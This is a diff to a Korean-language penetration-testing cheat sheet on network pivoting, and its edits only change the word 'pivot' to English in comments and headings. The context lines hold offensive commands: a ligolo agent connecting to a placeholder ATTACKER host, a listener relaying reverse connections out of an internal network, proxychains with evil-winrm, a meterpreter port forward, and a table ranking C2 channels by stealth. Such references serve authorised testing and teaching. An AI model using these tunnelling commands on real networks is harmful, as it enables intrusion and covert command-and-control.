@@ -156,7 +156,7 @@ sudo ip tuntap add user $(whoami) mode tun dev ligolo
 sudo ip link set ligolo up
 ./proxy -selfcert -laddr 0.0.0.0:11601
 
-# 에이전트 (피벗)
+# 에이전트 (Pivot)
 ./agent -connect ATTACKER:11601 -ignore-cert
 
 # 프록시에서
@@ -166,7 +166,7 @@ start                                          # 터널 시작
 
 # 리스너 추가 (Reverse Connection)
 listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
-# 내부 호스트 → 피벗:4444 → 공격자:4444
+# 내부 호스트 → Pivot:4444 → 공격자:4444
 ```
 
 ### sshuttle
@@ -191,7 +191,7 @@ proxychains evil-winrm -i TARGET -u admin -p PASS
 # 주의: proxychains는 TCP만 지원 (ICMP/UDP 불가)
 ```
 
-### 더블 피봇
+### 더블 Pivot
 
 ```text
 공격자 → PIVOT1 (DMZ) → PIVOT2 (내부) → TARGET
@@ -227,7 +227,7 @@ meterpreter> portfwd add -l 8080 -p 80 -r INTERNAL_TARGET
 |------|------|------|
 | HTTP/HTTPS | 방화벽 통과 용이 | 프록시/DPI 탐지 가능 |
 | DNS | 매우 은밀 | 느림 |
-| SMB (Named Pipe) | 내부 피봇 | 외부 통신 불가 |
+| SMB (Named Pipe) | 내부 Pivot | 외부 통신 불가 |
 | mTLS | 암호화, 빠름 | 비표준 포트 사용 |
 | DoH | DPI 우회 | 지원 도구 제한적 |
 
